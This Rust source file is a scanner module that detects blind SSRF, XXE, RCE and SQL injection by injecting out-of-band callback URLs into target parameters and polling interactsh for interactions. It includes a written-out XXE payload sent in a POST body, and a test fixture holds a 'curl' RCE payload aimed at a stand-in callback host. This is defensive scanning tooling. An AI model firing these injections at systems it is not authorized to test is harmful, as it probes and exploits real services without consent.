//! Interactsh OOB callback module for blind vulnerability detection.
//!
//! Wraps the `interactsh-client` CLI to detect blind SSRF, XXE, RCE, and `SQLi`
//! vulnerabilities by injecting OOB callback URLs into the target's parameters
//! and monitoring for interactions.
//!
//! Requires `interactsh-client` to be installed. The orchestrator automatically
//! skips this module when the tool is not available.

use std::time::Duration;

use async_trait::async_trait;
use url::Url;

use crate::engine::error::{Result, ScorchError};
use crate::engine::finding::Finding;
use crate::engine::module_trait::{ModuleCategory, ScanModule};
use crate::engine::oob::{self, BlindCategory, BlindPayload, InteractshSession, OobInteraction};
use crate::engine::scan_context::ScanContext;
use crate::engine::severity::Severity;

/// Blind vulnerability detection via Interactsh OOB callbacks.
///
/// Starts an `interactsh-client` session, injects OOB callback URLs into
/// the target's query parameters across four blind vulnerability categories
/// (SSRF, XXE, RCE, `SQLi`), then polls for interactions to confirm exploitability.
#[derive(Debug)]
pub struct InteractshModule;

#[async_trait]
impl ScanModule for InteractshModule {
    fn name(&self) -> &'static str {
        "Interactsh OOB Detection"
    }

    fn id(&self) -> &'static str {
        "interactsh"
    }

    fn category(&self) -> ModuleCategory {
        ModuleCategory::Scanner
    }

    fn description(&self) -> &'static str {
        "Detect blind SSRF, XXE, RCE, and SQLi via out-of-band callbacks"
    }

    fn requires_external_tool(&self) -> bool {
        true
    }

    fn required_tool(&self) -> Option<&str> {
        Some("interactsh-client")
    }

    async fn run(&self, ctx: &ScanContext) -> Result<Vec<Finding>> {
        let url = ctx.target.url.as_str();

        // Start the OOB session
        let mut session = InteractshSession::start().await?;
        let base_domain = session.base_url().to_string();

        // Collect all payloads and their correlation IDs
        let mut all_payloads: Vec<BlindPayload> = Vec::new();

        // Extract query parameters from the target URL for injection
        let parsed = Url::parse(url).map_err(|e| ScorchError::InvalidTarget {
            target: url.to_string(),
            reason: e.to_string(),
        })?;

        let params: Vec<(String, String)> =
            parsed.query_pairs().map(|(k, v)| (k.to_string(), v.to_string())).collect();

        if params.is_empty() {
            // No query parameters — inject into common parameter names
            for param_name in &["url", "redirect", "page", "cmd", "query", "input", "data"] {
                let payloads = oob::generate_blind_payloads(&base_domain, param_name);
                inject_payloads(ctx, url, param_name, &payloads).await;
                all_payloads.extend(payloads);
            }
        } else {
            // Inject into each existing query parameter
            for (param_name, _) in &params {
                let payloads = oob::generate_blind_payloads(&base_domain, param_name);
                inject_into_existing_params(ctx, &parsed, param_name, &payloads).await;
                all_payloads.extend(payloads);
            }
        }

        // Also test XXE via POST with Content-Type: application/xml
        let xxe_id = "xxe-body".to_string();
        let xxe_url = oob::callback_url(&base_domain, &xxe_id);
        let xxe_payload = format!(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [\
             <!ENTITY xxe SYSTEM \"http://{xxe_url}\">]>\
             <root>&xxe;</root>"
        );
        all_payloads.push(BlindPayload {
            correlation_id: xxe_id,
            category: BlindCategory::Xxe,
            payload: xxe_payload.clone(),
            description: "Blind XXE via POST body".to_string(),
        });

        let _ = ctx
            .http_client
            .post(url)
            .header("Content-Type", "application/xml")
            .body(xxe_payload)
            .send()
            .await;

        // Collect correlation IDs for matching
        let correlation_ids: Vec<String> =
            all_payloads.iter().map(|p| p.correlation_id.clone()).collect();

        // Poll for interactions
        let interactions = session.poll(Duration::from_secs(10)).await?;

        // Build findings from matched interactions
        let findings = build_findings(url, &all_payloads, &interactions, &correlation_ids);

        // Clean up the session
        session.stop().await?;

        Ok(findings)
    }
}

/// Inject payloads by appending a parameter to the target URL.
///
/// Used when the target URL has no existing query parameters — adds each
/// payload as a new parameter value.
async fn inject_payloads(
    ctx: &ScanContext,
    base_url: &str,
    param_name: &str,
    payloads: &[BlindPayload],
) {
    let Ok(parsed) = Url::parse(base_url) else {
        return;
    };

    for payload in payloads {
        let mut test_url = parsed.clone();
        test_url.query_pairs_mut().append_pair(param_name, &payload.payload);

        // Fire and forget — we don't care about the response, only the OOB callback
        let _ = ctx.http_client.get(test_url.as_str()).send().await;
    }
}

/// Inject payloads into an existing query parameter, preserving other params.
///
/// Replaces the target parameter's value with the payload while keeping
/// all other query parameters intact.
async fn inject_into_existing_params(
    ctx: &ScanContext,
    parsed_url: &Url,
    target_param: &str,
    payloads: &[BlindPayload],
) {
    let other_params: Vec<(String, String)> = parsed_url
        .query_pairs()
        .filter(|(k, _)| k != target_param)
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    for payload in payloads {
        let mut test_url = parsed_url.clone();
        {
            let mut query = test_url.query_pairs_mut();
            query.clear();
            for (k, v) in &other_params {
                query.append_pair(k, v);
            }
            query.append_pair(target_param, &payload.payload);
        }

        let _ = ctx.http_client.get(test_url.as_str()).send().await;
    }
}

/// Build findings from correlated OOB interactions.
///
/// Each matched interaction produces a finding with the appropriate severity,
/// OWASP category, and CWE based on the blind vulnerability category.
fn build_findings(
    target_url: &str,
    payloads: &[BlindPayload],
    interactions: &[OobInteraction],
    correlation_ids: &[String],
) -> Vec<Finding> {
    let matched = oob::correlate_interactions(interactions, correlation_ids);

    matched
        .into_iter()
        .filter_map(|(corr_id, interaction)| {
            // Find the payload that produced this correlation ID
            let payload = payloads.iter().find(|p| p.correlation_id == corr_id)?;

            let (severity, owasp, cwe) = match payload.category {
                BlindCategory::Ssrf => {
                    (Severity::Critical, "A10:2021 Server-Side Request Forgery", 918_u32)
                }
                BlindCategory::Xxe => {
                    (Severity::Critical, "A05:2021 Security Misconfiguration", 611_u32)
                }
                BlindCategory::Rce => (Severity::Critical, "A03:2021 Injection", 78_u32),
                BlindCategory::Sqli => (Severity::High, "A03:2021 Injection", 89_u32),
            };

            Some(
                Finding::new(
                    "interactsh",
                    severity,
                    format!("{} Confirmed via OOB Callback", payload.category),
                    format!(
                        "{}. An out-of-band {} interaction was received, confirming \
                         the vulnerability is exploitable.",
                        payload.description, interaction.protocol
                    ),
                    target_url,
                )
                .with_evidence(format!(
                    "OOB callback received | Protocol: {} | Correlation: {} | \
                     Remote: {}",
                    interaction.protocol,
                    corr_id,
                    interaction.remote_address.as_deref().unwrap_or("unknown"),
                ))
                .with_remediation(remediation_for(payload.category))
                .with_owasp(owasp)
                .with_cwe(cwe)
                .with_confidence(0.7),
            )
        })
        .collect()
}

/// Return category-specific remediation guidance.
const fn remediation_for(category: BlindCategory) -> &'static str {
    match category {
        BlindCategory::Ssrf => {
            "Validate and sanitize URL parameters. Use allowlists for permitted \
             domains. Block requests to internal IP ranges and cloud metadata endpoints."
        }
        BlindCategory::Xxe => {
            "Disable external entity processing in XML parsers. Use \
             `XMLInputFactory.setProperty(SUPPORT_DTD, false)` or equivalent. \
             Consider using JSON instead of XML."
        }
        BlindCategory::Rce => {
            "Never pass user input to shell commands. Use parameterized APIs \
             instead of string concatenation. Apply strict input validation with \
             allowlists."
        }
        BlindCategory::Sqli => {
            "Use parameterized queries or prepared statements. Never concatenate \
             user input into SQL strings. Apply the principle of least privilege \
             to database accounts."
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Tests for interactsh OOB interaction correlation and finding builder.

    /// Verify that `build_findings` correctly correlates OOB interactions
    /// with payloads and produces findings with proper severity and CWE.
    #[test]
    fn test_build_findings() {
        let payloads = vec![
            BlindPayload {
                correlation_id: "ssrf-test".to_string(),
                category: BlindCategory::Ssrf,
                payload: "http://ssrf-test.oob.example.com".to_string(),
                description: "Blind SSRF via url parameter".to_string(),
            },
            BlindPayload {
                correlation_id: "rce-test".to_string(),
                category: BlindCategory::Rce,
                payload: "curl rce-test.oob.example.com".to_string(),
                description: "Blind RCE via cmd parameter".to_string(),
            },
        ];

        let interactions = vec![OobInteraction {
            protocol: "http".to_string(),
            unique_id: "oob.example.com".to_string(),
            full_id: "ssrf-test.oob.example.com".to_string(),
            raw_request: None,
            remote_address: Some("10.0.0.1".to_string()),
            timestamp: Some("2025-01-01T00:00:00Z".to_string()),
        }];

        let correlation_ids: Vec<String> =
            payloads.iter().map(|p| p.correlation_id.clone()).collect();

        let findings = build_findings(
            "https://example.com?url=test",
            &payloads,
            &interactions,
            &correlation_ids,
        );

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].cwe_id, Some(918));
        assert!(findings[0].title.contains("SSRF"));
    }

    /// Verify that `build_findings` returns no findings when there are
    /// no correlated interactions.
    #[test]
    fn test_build_findings_empty() {
        let findings = build_findings("https://example.com", &[], &[], &[]);
        assert!(findings.is_empty());
    }
}
